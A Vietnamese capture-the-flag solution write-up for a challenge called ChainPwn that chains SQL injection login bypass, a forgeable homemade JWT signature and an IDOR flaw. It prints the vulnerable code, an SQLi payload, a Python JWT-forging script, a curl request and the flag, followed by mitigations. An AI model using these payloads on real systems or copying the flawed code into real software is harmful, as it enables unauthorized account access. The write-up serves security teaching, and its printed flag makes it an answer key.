# Thử thách 20: ChainPwn - Giải pháp

## Loại lỗ hổng
**Exploit Chain (Chuỗi khai thác đa bước): SQL Injection → IDOR → JWT Forgery**

## Mô tả
Thử thách này yêu cầu phải kết hợp 3 lỗ hổng khác nhau để chiến thắng: Lỗ hổng SQLi để bypass đăng nhập, lỗ hổng IDOR để lấy cờ của Admin, và lỗ hổng thuật toán chữ ký JWT yếu để qua mặt lớp Authorization.

## Mã nguồn chứa lỗ hổng

### 1. SQL Injection tại form Đăng nhập
```javascript
user = db.prepare(`SELECT * FROM users WHERE username='${username}' AND password='${password}'`).get();
```

### 2. IDOR tại API lấy Flag
```javascript
// VULNERABLE: uses uid from query param, not from token
const uid = parseInt(req.query.uid) || payload.uid;
```

### 3. Chữ ký JWT yếu (Mã hóa thuần túy không có Secret)
```javascript
// VULNERABLE: sig = base64(header + '.' + payload) — forgeable
const s = Buffer.from(h+'.'+p).toString('base64url');
```

## Các bước khai thác

### Bước 1: Bypass Đăng nhập bằng SQLi
Nhập payload sau vào ô Username:
```text
admin' --
```
Điều này khiến câu truy vấn SQL trở thành:
```sql
SELECT * FROM users WHERE username='admin' --' AND password='...'
```
Mật khẩu bị bỏ qua (comment out), bạn sẽ đăng nhập thành công vào account Admin.

### Bước 2: Bóc tách cấu trúc JWT
Vào giao diện Dashboard, bạn sẽ thấy chuỗi JWT của tài khoản:
Đem chuỗi này đi decode Base64URL, ta thấy:
- **Header:** `{"alg":"HS256","typ":"JWT"}`
- **Payload:** `{"uid":1,"username":"admin","role":"admin"}`
- **Signature:** Bất ngờ là phần chữ ký thực chất chỉ là Base64URL của (Header + '.' + Payload), hoàn toàn không có thuật toán băm bảo mật (HMAC) hay Secret Key nào cả!

### Bước 3: Rèn JWT giả mạo (Nếu đăng nhập bằng tài khoản Bob)
Nếu bạn không dùng SQLi mà đăng nhập bằng tài khoản Bob bình thường, bạn hoàn toàn có thể tự tạo (forge) một JWT của Admin do biết rõ "công thức sinh chữ ký yếu" ở trên.

```python
import base64
import json

def base64url_encode(data):
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip('=')

# Tạo Payload của Admin
header = {"alg":"HS256","typ":"JWT"}
payload = {"uid":1,"username":"admin","role":"admin"}

h = base64url_encode(json.dumps(header))
p = base64url_encode(json.dumps(payload))
s = base64url_encode(h + '.' + p)  # Chữ ký tự chế yếu kém

forged_token = f"{h}.{p}.{s}"
```

### Bước 4: Khai thác IDOR để cướp Flag
Gửi GET request tới `/api/flag` nhưng ép thêm tham số `uid=1`:
```bash
curl "http://[host]/api/flag?uid=1&token=[ADMIN_JWT_TOKEN]"
```
API nhận `uid=1` từ URL Query (thay vì lấy an toàn từ JWT Payload) dẫn tới lỗi IDOR, và trả về nội dung của Admin:
```json
{
  "flag": "FCTF{ch41n_3xpl01t_m4st3r}",
  "requested_uid": 1,
  "token_user": "admin"
}
```

## Flag
```
FCTF{ch41n_3xpl01t_m4st3r}
```

## Tóm tắt chuỗi lỗ hổng (Exploit Chain)
```text
┌─────────────────┐
│  SQL Injection  │ → Bypass login, chiếm phiên Admin
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  Weak JWT Sig   │ → Phát hiện chữ ký JWT có thể tự chế
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│      IDOR       │ → Truy cập API với uid=1 và JWT tự tạo
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│   Lấy Flag! 🚩  │
└─────────────────┘
```

## Biện pháp phòng ngừa (Mitigation)
- **Fix SQLi:** Luôn dùng Prepared Statements hoặc Parameterized Queries.
- **Fix IDOR:** Trong các API bảo mật, phải lấy ID user từ dữ liệu của phiên đăng nhập an toàn (như session object hoặc JWT payload sau khi verify), tuyệt đối KHÔNG tin vào giá trị `id` mà client truyền lên qua URL hay Body.
- **Fix JWT:** Phải sử dụng các thư viện chuẩn mực của JWT (`jsonwebtoken` trong Node.js) và ký token bằng Khóa Bí Mật (Secret Key) thực thụ thông qua các thuật toán như HS256 hoặc RS256.
